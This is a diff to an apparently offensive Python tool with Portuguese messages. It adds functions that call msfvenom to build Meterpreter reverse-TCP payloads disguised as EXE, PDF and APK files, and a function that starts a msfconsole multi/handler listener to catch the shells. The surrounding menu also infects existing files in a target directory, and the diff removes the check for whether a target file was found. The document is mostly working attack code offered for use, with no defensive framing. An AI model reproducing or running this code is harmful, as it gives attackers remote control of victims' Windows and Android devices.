@@ -43,6 +43,50 @@ def infect_existing_file(file_path, lhost, lport):
     except Exception as e:
         print(f"Erro ao infectar o arquivo: {str(e)}")
 
+def generate_payload(payload_type, lhost, lport):
+    if payload_type == "exe":
+        print("Gerando payload para EXE...")
+        cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", "payload.exe"]
+        print("Comando usado para gerar o payload:")
+        print(" ".join(cmd))
+        try:
+            subprocess.call(cmd)
+            print("Payload gerado com sucesso.")
+        except Exception as e:
+            print(f"Erro ao gerar payload: {str(e)}")
+    elif payload_type == "pdf":
+        print("Gerando payload para PDF...")
+        cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "pdf", "-o", "payload.pdf"]
+        print("Comando usado para gerar o payload:")
+        print(" ".join(cmd))
+        try:
+            subprocess.call(cmd)
+            print("Payload gerado com sucesso.")
+        except Exception as e:
+            print(f"Erro ao gerar payload: {str(e)}")
+    elif payload_type == "apk":
+        print("Gerando payload para APK...")
+        cmd = ["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "payload.apk"]
+        print("Comando usado para gerar o payload:")
+        print(" ".join(cmd))
+        try:
+            subprocess.call(cmd)
+            print("Payload gerado com sucesso.")
+        except Exception as e:
+            print(f"Erro ao gerar payload: {str(e)}")
+    else:
+        print("Tipo de payload não suportado.")
+
+def start_listener(lhost, lport):
+    print(f"Iniciando listener em {lhost}:{lport}...")
+    cmd = f"use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit"
+    print("Comando usado para iniciar o listener:")
+    print(cmd)
+    try:
+        subprocess.call(["msfconsole", "-q", "-x", cmd])
+    except Exception as e:
+        print(f"Erro ao iniciar o listener: {str(e)}")
+
 def main():
     local_ip = get_local_ip()
     while True:
@@ -73,10 +117,7 @@ def main():
             start_listener(lhost, lport)
         elif option == "3":
             target_file = find_target_file(target_directory)
-            if target_file:
-                infect_existing_file(target_file, lhost, lport)
-            else:
-                print("Nenhum arquivo alvo encontrado no diretório especificado.")
+            infect_existing_file(target_file, lhost, lport)
         elif option == "4":
             print("Encerrando o programa.")
             break
